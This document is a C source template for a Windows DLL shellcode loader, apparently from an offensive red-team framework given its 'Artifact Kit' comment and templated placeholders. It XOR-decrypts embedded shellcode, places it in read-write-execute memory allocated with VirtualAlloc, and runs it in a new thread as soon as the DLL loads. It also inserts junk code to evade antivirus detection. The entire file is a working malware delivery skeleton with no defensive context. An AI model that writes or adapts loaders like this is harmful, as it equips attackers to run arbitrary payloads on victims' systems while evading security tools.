#include <windows.h>

{{.JunkFunctions}}

// Artifact Kit Placeholder: Shellcode
unsigned char {{.VarShellcode}}[] = { {{.Shellcode}} };

void {{.FuncExec}}() {
    // Junk Code
    {{.JunkCode}}

    // XOR Decryption
    unsigned char {{.VarKey}} = {{.XorKey}};
    for (size_t i = 0; i < sizeof({{.VarShellcode}}); i++) {
        {{.VarShellcode}}[i] ^= {{.VarKey}};
    }

    LPVOID addr = VirtualAlloc(NULL, sizeof({{.VarShellcode}}), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, {{.VarShellcode}}, sizeof({{.VarShellcode}}));
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){{.FuncExec}}, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
